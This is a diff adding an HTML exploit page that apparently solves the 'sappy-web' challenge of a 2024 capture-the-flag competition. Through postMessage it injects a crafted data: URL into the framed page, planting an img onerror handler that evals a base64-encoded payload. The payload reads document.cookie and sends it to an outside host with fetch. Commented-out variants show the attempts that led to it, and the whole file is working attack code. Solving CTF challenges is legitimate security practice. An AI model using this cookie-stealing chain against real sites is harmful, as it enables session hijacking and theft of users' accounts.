@@ -1,0 +1,26 @@
+<iframe id=sap src="https://sappy-web.2024.ctfcompetition.com/sap.html"></iframe>
+<script>
+	const sap = document.getElementById("sap");
+	function sendMsg(msg) {
+		sap.contentWindow.postMessage(JSON.stringify(msg), "*");
+	}
+
+	payload = `fetch("https://lyra.horse/?" + window.open("/").window.document.cookie)`;
+
+
+	setTimeout(()=>sendMsg({
+		method: "initialize",
+		//host: "https://sappy-web.2024.ctfcompetition.com",
+		//#host: "https://sappy-web.2024.ctfcompetition.com/#",
+		//host: "https://sappy-web.2024.ctfcompetition.com:1337",
+		//host: "data://sappy-web.2024.ctfcompetition.com/a",
+		// host: "data:sappy-web.2024.ctfcompetition.com/plain,{\"html\":\"<h1>lol\"}",
+		//host: "data://sappy-web.2024.ctfcompetition.com/plain,{\"html\":\"<h1>lol\",\"lol\":\"",
+		host: "data://sappy-web.2024.ctfcompetition.com/plain,{\"html\":\"<img src=x onerror=eval(atob('" + btoa(payload) +  "'))>\",\"lol\":\"",
+		//host: "data://sappy-web.2024.ctfcompetition.com/plain,{\"html\":\"<img src=x onerror=alert(document.cookie)>\",\"lol\":\"",
+	}), 1000);
+	setTimeout(()=>sendMsg({
+		method: "render",
+		page: "\"}",
+	}), 2000);
+</script>
